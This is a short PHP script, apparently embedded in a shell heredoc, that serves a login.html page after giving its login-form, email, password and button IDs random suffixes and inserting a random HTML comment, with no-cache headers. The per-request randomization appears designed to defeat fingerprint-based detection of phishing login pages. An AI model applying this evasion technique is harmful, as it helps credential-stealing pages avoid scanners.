'CACHEEOF'
<?php
ob_start();
$html_file = __DIR__ . '/login.html';
if (!file_exists($html_file)) {
    $html_file = dirname(__DIR__) . '/login.html';
}
if (!file_exists($html_file)) {
    die('Template not found');
}
$suffix = substr(md5(time() . rand(1000, 9999)), 0, 6);
$html = file_get_contents($html_file);
$html = str_replace(
    ['login-form', 'email-input', 'pass-input', 'login-btn'],
    ['login-form-' . $suffix, 'email-' . $suffix, 'pass-' . $suffix, 'btn-' . $suffix],
    $html
);
$rand_comment = "<!-- " . bin2hex(random_bytes(8)) . " -->\n";
$html = str_replace('<head>', "<head>\n" . $rand_comment, $html);
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=utf-8');
echo $html;
ob_end_flush();
CACHEEOF